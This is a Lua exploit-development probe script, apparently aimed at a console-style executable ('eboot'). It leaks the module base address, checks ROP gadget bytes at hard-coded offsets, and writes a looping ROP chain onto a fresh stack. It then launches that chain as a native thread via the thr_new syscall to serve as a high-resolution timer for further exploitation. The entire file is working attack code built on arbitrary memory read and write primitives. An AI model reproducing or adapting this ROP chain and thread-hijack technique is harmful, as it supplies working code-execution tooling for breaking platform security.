-- CRASH_CLASS: LOW
-- PROBE 1403m: timer thread via ROP loop
--
-- Starts a child thread that increments a shared counter in a tight
-- ROP loop. Main thread reads the counter before and after a busy-wait
-- to measure the increment rate.
--
-- Loop design (3 gadgets per iteration, ~10 cycles):
--   inc qword [rdi] → pop_rbp → leave;ret → back to inc
--
-- Gadgets needed:
--   pop_rax;ret      = eboot+0x992   (child entry; doesn't clobber RDI)
--   inc qword [rdi];ret = eboot+0x161779 (48 FF 07 C3)
--   pop_rbp;ret      = eboot+0x79    (5D C3)
--   leave;ret        = eboot+0x1A2AE3 (C9 C3)
--   pop_rdi;ret      = eboot+0xC9DFE  (for marking result)
--   mov [rdi],rax;ret = eboot+0x92C67  (for writing result)
--   syscall;ret      = derived from sysarch(see below)

print("=== 1403m: timer thread ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wq2(a, hi, lo)
    wd(a, lo); wd(a + 4, hi)
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end

-- ============================================================
-- [A] Eboot base and gadgets
-- ============================================================
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local ebn = N(eboot)
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadget addresses
local g = {}
local function ga(name, off)
    local addr = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
    g[name] = { get_hi_lo(addr) }
    return addr
end

ga("pop_rax_ret",   0x992)
ga("pop_rdi_ret",   0xC9DFE)
ga("pop_rbp_ret",   0x79)
ga("mov_w",         0x92C67)
ga("inc64_rdi_ret", 0x161779)
ga("leave_ret",     0x1A2AE3)

-- Verify gadget bytes
print("")
print("=== [A] verify gadgets ===")
local function vg(name, off, expected)
    local v = rd(ebn + off)
    if not v then
        print(string.format("  %s +0x%06X: UNREADABLE", name, off))
        return false
    end
    local b0 = v % 256
    local b1 = math.floor(v / 256) % 256
    local b2 = math.floor(v / 65536) % 256
    local b3 = math.floor(v / 16777216) % 256
    local hex = string.format("%02X %02X %02X %02X", b0, b1, b2, b3)
    local ok = (hex == expected)
    print(string.format("  %s +0x%06X: %s %s", name, off, hex, ok and "OK" or "MISMATCH"))
    return ok
end

local ok = true
ok = vg("pop_rax_ret",   0x992,    "58 C3 48 89") and ok -- 58=pop rax, C3=ret
ok = vg("pop_rbp_ret",   0x79,     "5D C3 48 89") and ok -- 5D=pop rbp, C3=ret (guess next)
ok = vg("inc64_rdi_ret", 0x161779, "48 FF 07 C3") and ok -- 48 FF 07=inc qword [rdi], C3=ret
ok = vg("leave_ret",     0x1A2AE3, "C9 C3 00 00") and ok -- C9=leave, C3=ret (guess padding)

if not ok then
    print("GADGET MISMATCH — adjusting or aborting")
end

-- ============================================================
-- [B] Allocate shared counter
-- ============================================================
print("")
print("=== [B] counter setup ===")
local counter_buf = memory.alloc(64) -- 64 bytes, 8-byte aligned
local counter_n = N(counter_buf)
-- Zero the counter
for i = 0, 56, 4 do wd(counter_n + i, 0) end
print(string.format("counter at 0x%X", counter_n))

-- ============================================================
-- [C] Build timer thread ROP chain
-- ============================================================
print("")
print("=== [C] build chain ===")

local STACK_SIZE = 0x4000 -- 16KB stack (small, we only use 40 bytes at top)
local stk = memory.alloc(STACK_SIZE + 64)
local stk_n = N(stk)
-- Zero stack
for i = 0, STACK_SIZE - 4, 4 do wd(stk_n + i, 0) end

-- RSP = ((stk_n + STACK_SIZE) & ~0xF) - 8
local rsp = stk_n + STACK_SIZE
rsp = math.floor(rsp / 16) * 16 - 8

-- Chain layout (7 qwords, 56 bytes at rsp):
-- slot 0 (rsp+0):  dummy for pop_rax
-- slot 1 (rsp+8):  inc64_rdi_ret  ← LOOP TARGET
-- slot 2 (rsp+16): pop_rbp_ret
-- slot 3 (rsp+24): rsp (RBP value = chain_base for leave)
-- slot 4 (rsp+32): leave_ret
-- (leave resets RSP to rsp, pops slot 0 into RBP, rets to slot 1)

local chain = {
    {0, 0xDEAD},                    -- slot 0: dummy for pop_rax
    {g.inc64_rdi_ret[1], g.inc64_rdi_ret[2]},  -- slot 1: inc qword [rdi]; ret
    {g.pop_rbp_ret[1],  g.pop_rbp_ret[2]},     -- slot 2: pop rbp; ret
    {get_hi_lo(uint64(string.format("0x%X", rsp)))}, -- slot 3: RBP = chain_base
    {g.leave_ret[1],    g.leave_ret[2]},        -- slot 4: leave; ret
}

-- Fix slot 3 (chain_base = rsp)
local rsp_hi = math.floor(rsp / 0x100000000)
local rsp_lo = rsp % 0x100000000
chain[4] = {rsp_hi, rsp_lo}

for i, entry in ipairs(chain) do
    local off = (i - 1) * 8
    wd(rsp + off, entry[2])      -- lo
    wd(rsp + off + 4, entry[1])  -- hi
end

print(string.format("rsp=0x%X chain=%d slots", rsp, #chain))

-- ============================================================
-- [D] Read counter before, start child, wait, read after
-- ============================================================
print("")
print("=== [D] start timer thread ===")

-- Read counter before
local c_before_lo = rd(counter_n) or 0
local c_before_hi = rd(counter_n + 4) or 0
print(string.format("counter_before: 0x%X%08X", c_before_hi, c_before_lo))

-- thr_new(455)
local sc_thr = mk(455)
local ctid = memory.alloc(8)
wq2(N(ctid), 0, 0)

local param = memory.alloc(0x40)
local param_n = N(param)
-- start_func = pop_rax;ret (preserves RDI = arg)
wq2(param_n + 0x00, g.pop_rax_ret[1], g.pop_rax_ret[2]) -- start_func
wq2(param_n + 0x08, get_hi_lo(counter_buf))               -- arg = counter addr → RDI
wq2(param_n + 0x10, get_hi_lo(stk))                       -- stack_base
wq2(param_n + 0x18, 0, STACK_SIZE)                         -- stack_size
wq2(param_n + 0x20, 0, 0)                                 -- tls_base
wq2(param_n + 0x28, 0, 0)                                 -- tls_size
wq2(param_n + 0x30, get_hi_lo(ctid))                      -- child_tid

local ok_thr, rv_thr = pcall(function()
    return sc_thr(uint64(string.format("0x%X", param_n)),
                  uint64(string.format("0x%X", 0x38)))
end)

local thr_rv = -999
if ok_thr then thr_rv = N(rv_thr) end
print(string.format("thr_new rv=%d", thr_rv))

if thr_rv ~= 0 then
    print("thr_new FAILED")
    print("=== 1403m DONE ===")
    return
end

local child_tid = rd(N(ctid)) or 0
print(string.format("child_tid=%d", child_tid))

-- ============================================================
-- [E] Measure counter increment rate
-- ============================================================
print("")
print("=== [E] measure ===")

-- Read counter immediately after thread start
local c0_lo = rd(counter_n) or 0
local c0_hi = rd(counter_n + 4) or 0
print(string.format("t0: 0x%X%08X", c0_hi, c0_lo))

-- Busy wait in Lua (each iteration ~few microseconds)
local dummy = 0
for i = 1, 50000 do dummy = dummy + 1 end

local c1_lo = rd(counter_n) or 0
local c1_hi = rd(counter_n + 4) or 0
print(string.format("t1 (after 50K lua): 0x%X%08X", c1_hi, c1_lo))

-- Another wait
for i = 1, 50000 do dummy = dummy + 1 end

local c2_lo = rd(counter_n) or 0
local c2_hi = rd(counter_n + 4) or 0
print(string.format("t2 (after 100K lua): 0x%X%08X", c2_hi, c2_lo))

-- Short wait
for i = 1, 10000 do dummy = dummy + 1 end

local c3_lo = rd(counter_n) or 0
local c3_hi = rd(counter_n + 4) or 0
print(string.format("t3 (after 110K lua): 0x%X%08X", c3_hi, c3_lo))

-- Delta
local delta1 = (c1_hi * 0x100000000 + c1_lo) - (c0_hi * 0x100000000 + c0_lo)
local delta2 = (c2_hi * 0x100000000 + c2_lo) - (c1_hi * 0x100000000 + c1_lo)
local delta3 = (c3_hi * 0x100000000 + c3_lo) - (c2_hi * 0x100000000 + c2_lo)
print(string.format("delta1=%d delta2=%d delta3=%d", delta1, delta2, delta3))

-- Check if counter is advancing
if delta1 == 0 and delta2 == 0 then
    print("COUNTER NOT ADVANCING — timer thread not running")
else
    print("TIMER THREAD ALIVE")
    -- Estimate rate: delta1 counts in ~50K Lua iterations
    -- Each Lua iteration is roughly ~1-10 microseconds
    -- So delta1 counts per ~50-500ms
    if delta1 > 0 then
        print(string.format("~%d increments per 50K lua ops", delta1))
    end
end

-- ============================================================
-- [F] Quick timing test: time a single read_qword
-- ============================================================
print("")
print("=== [F] timing precision ===")

-- Read counter, do one operation, read counter again
local samples = {}
for s = 1, 10 do
    local a_lo = rd(counter_n) or 0
    local a_hi = rd(counter_n + 4) or 0
    -- Operation: read a qword from heap
    local _ = rq(counter_buf)
    local b_lo = rd(counter_n) or 0
    local b_hi = rd(counter_n + 4) or 0
    local d = (b_hi * 0x100000000 + b_lo) - (a_hi * 0x100000000 + a_lo)
    samples[#samples+1] = d
end

local min_d, max_d = samples[1], samples[1]
for _, d in ipairs(samples) do
    if d < min_d then min_d = d end
    if d > max_d then max_d = d end
end
print(string.format("10 read_qword samples: min=%d max=%d", min_d, max_d))
for i, d in ipairs(samples) do
    print(string.format("  [%d] delta=%d", i, d))
end

print("")
print("=== 1403m DONE ===")
